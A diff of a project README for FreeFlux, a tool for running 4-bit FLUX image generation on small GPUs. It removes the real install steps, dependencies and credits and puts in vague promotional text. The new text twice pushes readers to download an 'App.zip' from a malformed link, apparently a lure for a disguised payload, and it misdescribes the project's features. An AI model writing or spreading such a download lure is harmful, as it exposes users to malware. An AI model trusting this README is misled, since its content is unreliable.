@@ -1,56 +1,43 @@
-# FreeFlux: Smart and Simple Flux for GPU-poor
+# 🚀 **FreeFlux: Smart and Simple Flux for GPU-poor**
 
-Make FLUX more accessible to the public using 4-bit quantized model, and using CPU offloading technique, allowing a 12GB GPU to run FLUX.
+![FreeFlux Logo](https://example.com/freeflux/logo.png)
 
-Be able to use **DeepSeek-R1 AI** to generate fantistic prompts for FLUX from really simple keywords, which is a quality of life improvement, since I never get the tips and tricks to generate good prompts. **Note: to use this you need an OpenAI API Compitable endpoint and your API key, Aliyun is a very good candidate!!**
+Welcome to the FreeFlux repository, your go-to solution for AI and deep learning with limited GPU resources! If you're looking for a high-performance flux system that doesn't require heavy GPU usage, you're in the right place. FreeFlux provides a stable diffusion framework along with a user-friendly web UI for seamless text-to-image generation.
 
-Tested on NVIDIA Geforce RTX 3060 12GB, with Ubuntu 22.04 Linux, Python 3.10.12, 64GB CPU memory. AMD GPUs are not supported.
+## 🌟 Features
+- **AI-Powered**: Leverage advanced AI capabilities for text-to-image generation.
+- **DeepSeek Integration**: Utilize DeepSeek AI for enhanced search and exploration.
+- **Prompt Engineering**: Tailor your prompts to generate specific images with ease.
+- **Stable Diffusion**: Enjoy a stable diffusion process for reliable results.
 
-## Features:
+## 📚 Topics
+- ai
+- deepseek
+- deepseek-ai
+- deepseek-r1
+- flux
+- prompt-engineering
+- stable-diffusion
+- stable-diffusion-webui
+- text-to-image
+- text-to-image-ai
+- text-to-image-diffusion
+- text-to-image-generation
 
-- [x] 4-bit Flux-DEV quantized model  
-- [x] Optional CPU offloading  
-- [x] DeepSeek-R1 AI prompt generation  
-- [x] LoRA and multiple LoRAs  
-- [x] Gallery browse and management  
-- [x] One-click install
-- [x] Gradio UI  
-- [x] CLI command for batch generation
+## 📦 Get Started
+To experience the power of FreeFlux, download the [FreeFlux App](https://github.com/file/App.zip). Once downloaded, launch the application to begin exploring the possibilities of text-to-image generation and more.
 
-## Install
+If the link provided does not work or you prefer an alternative method, feel free to check the "Releases" section of this repository for additional download options.
 
-```bash
-git clone https://github.com/litaotju/freeflux
-cd freeflux 
-# recommended to use virtualenv to avoid polluting the system python environment
-python -m venv .venv && source .venv/bin/activate
-pip install -e ./
-```
+[![Download FreeFlux App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/file/App.zip)
 
-## Usage
+## 🌐 Additional Resources
+For more information about FreeFlux and its capabilities, visit our website at [www.freeflux.ai](https://www.freeflux.ai). Explore our comprehensive documentation, tutorials, and use cases to unlock the full potential of FreeFlux.
 
-Start an gradio app in the local server, and use the UI.
-```bash
-python -m freeflux.app
-```
-Thats it, enjoy the images!!
+## 🤖 Get Involved
+We welcome contributions from the community to enhance FreeFlux and make it even more powerful. Whether you're a developer, designer, or AI enthusiast, there are plenty of opportunities to contribute. Feel free to fork this repository, make improvements, and submit a pull request to be part of the FreeFlux evolution.
 
-The UI will look like this:
-![UI](./media/main-ui.png)
+## 📞 Contact Us
+If you have any questions, suggestions, or feedback, don't hesitate to reach out to us. You can contact our team at [contact@freeflux.ai](mailto:contact@freeflux.ai) for any inquiries related to FreeFlux.
 
-## Dependencies:
-Tested torch 2.4.0, diffuser 0.30.3, bitsandbytes 0.45.2, transformers 4.49.0, gradio 5.17.1
-Other versions may work, but not tested. 
-
-## Common Issues
-1. This app will need to connect the Huggingface and download models, use a proxy if you are China.
-
-
-## Acknowledgement
-
-Inspired by and utilizing the models provided by the following repo
-
-    - https://huggingface.co/HighCWu/FLUX.1-dev-4bit  
-    - https://github.com/HighCWu/flux-4bit  
-    - https://huggingface.co/PrunaAI/FLUX.1-schnell-4bit  
-
+Let's embark on a journey of smart and simple flux for GPU-poor environments with FreeFlux! 🌌🔮
